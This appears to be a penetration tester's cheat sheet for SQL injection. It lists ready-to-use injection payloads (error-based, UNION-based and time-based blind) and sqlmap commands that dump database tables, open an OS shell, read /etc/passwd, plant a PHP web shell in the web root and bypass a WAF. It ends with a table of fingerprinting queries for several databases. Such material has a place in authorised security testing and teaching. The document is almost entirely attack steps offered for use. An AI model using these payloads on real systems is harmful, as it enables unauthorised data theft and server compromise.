title: sqli
html:
sqli

> Test any user input that queries a database. Use manual testing first, then SQLMap for automation.

Manual Testing

# Error-based detection
' OR 1=1-- -
" OR 1=1-- -
' UNION SELECT NULL-- -
' AND 1=CONVERT(int,(SELECT @@version))-- -

# UNION-based (find column count first)
' ORDER BY 1-- -   (increment until error)
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -

# Time-based blind
' AND SLEEP(5)-- -                    (MySQL)
'; WAITFOR DELAY '0:0:5'-- -          (MSSQL)
' AND pg_sleep(5)-- -                 (PostgreSQL)

SQLMap

# Basic (GET parameter)
sqlmap -u "http://target/page?id=1" --batch

# From request file (Burp)
sqlmap -r request.txt --batch

# POST data
sqlmap -u "http://target/login" --data "user=admin&pass=test" --batch

# Enumerate
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D dbname --tables
sqlmap -r req.txt --batch -D dbname -T users --dump

# OS shell (if stacked queries + write perms)
sqlmap -r req.txt --batch --os-shell

# File read/write
sqlmap -r req.txt --file-read "/etc/passwd"
sqlmap -r req.txt --file-write shell.php --file-dest /var/www/html/shell.php

# WAF bypass
sqlmap -r req.txt --tamper=space2comment --random-agent --level 5 --risk 3

Database-Specific

| DB | Version | Current User | Databases | |----|---------|-------------|-----------| | MySQL | @@version | current_user() | information_schema.schemata | | MSSQL | @@version | SYSTEM_USER | master..sysdatabases | | PostgreSQL | version() | current_user | pg_database | | Oracle | v$version | SYS_CONTEXT('USERENV','SESSION_USER') | all_tables | | SQLite | sqlite_version() | N/A | sqlite_master |
